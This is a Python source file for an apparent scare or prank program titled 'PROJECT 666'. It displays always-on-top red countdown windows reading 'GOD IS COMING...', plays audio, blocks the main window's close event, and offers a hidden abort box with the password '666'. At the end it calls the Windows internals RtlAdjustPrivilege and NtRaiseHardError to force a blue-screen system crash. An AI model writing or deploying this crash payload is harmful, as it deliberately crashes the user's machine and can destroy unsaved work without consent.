from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QDesktopWidget, QPushButton, QLineEdit
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QPixmap
import sys
import time
from pygame import mixer
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref

def ending(app):
    window = QMainWindow()
    window.setWindowFlags(
            window.windowFlags() | 
            Qt.FramelessWindowHint | 
            Qt.WindowStaysOnTopHint
        )
    window.setGeometry(int(QDesktopWidget().availableGeometry().center().x() - 500), 0, 1000, 250)
    window.setAttribute(Qt.WA_TranslucentBackground, on=True)
    
    label = QLabel(window)
    label.setGeometry(0, 0, 1000, 250)
    label.setAlignment(Qt.AlignCenter)
    label.setStyleSheet("font-size:100px;color:red;")

    label.setGeometry(0, 0, 1000, 250)
    label.setAlignment(Qt.AlignCenter)
    label.setStyleSheet("font-size:100px;color:red;")

    window.show()


    mixer.init()
    mixer.music.load("res/audio/god.mp3")
    mixer.music.play()


    WIDTH = 532
    HEIGHT = 385

    abort_win = QMainWindow()
    abort_win.setWindowTitle("PROJECT 666")
    abort_win.setFixedSize(WIDTH, HEIGHT)
    abort_win.setWindowFlag(Qt.WindowCloseButtonHint, False)

    background_image = QLabel(abort_win)
    background_image.setPixmap(QPixmap("res/img/abort_bg.jpg"))
    background_image.setGeometry(0, 0, WIDTH, HEIGHT)

    abort_input = QLineEdit(abort_win)
    abort_input.setGeometry(116,200,300,70)
    abort_input.setEchoMode(QLineEdit.Password)
    abort_input.setStyleSheet("font-size:30px;letter-spacing:10px;color:red;")
    abort_input.setAlignment(Qt.AlignCenter)

    def abort():
        if abort_input.text() == "666":
            sys.exit()

    abord_submit = QPushButton(abort_win)
    abord_submit.setText("ABORT!")
    abord_submit.setGeometry(116,270,300,20)
    abord_submit.clicked.connect(abort)

    def code(): # ABORT SEQUENCE
        abort_win.show()


    eye = QMainWindow()
    eye.setWindowFlags(
            window.windowFlags() | 
            Qt.FramelessWindowHint | 
            Qt.WindowStaysOnTopHint
        )
        
    eye.setGeometry(int(QDesktopWidget().availableGeometry().center().x() - 125), int(QDesktopWidget().availableGeometry().center().y() + 300), 350, 250)
    eye.setAttribute(Qt.WA_TranslucentBackground, on=True)

    eye_label = QLabel(eye)
    eye_label.setPixmap(QPixmap("res/img/eye.png"))
    eye_label.setGeometry(0,0,350,250)
    eye_label.setAlignment(Qt.AlignCenter)

    eye_button = QPushButton(eye)
    eye_button.setGeometry(125,70,100,70)
    eye_button.setStyleSheet("background-color:transparent;")
    eye_button.clicked.connect(code)
    
    eye.show()

    def closeEvent(event):
        event.ignore()

    window.closeEvent = closeEvent

    for i in range(57):
        app.processEvents()
        label.setText(str(-(i-56)) + "\nGOD IS COMING...")
        window.show()
        time.sleep(1)

    
    window.setGeometry(int(QDesktopWidget().availableGeometry().center().x() - 1000), int(QDesktopWidget().availableGeometry().center().y() - 125), 2000, 250)
    label.setGeometry(0, 0, 2000, 250)
    label.setText("GOD IS HERE!")
    eye.hide()
    label.setAlignment(Qt.AlignCenter)
    label.setStyleSheet("font-size:200px;color:red;")
    window.show()

    while mixer.music.get_busy():
        app.processEvents()

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

    sys.exit(app.exec_())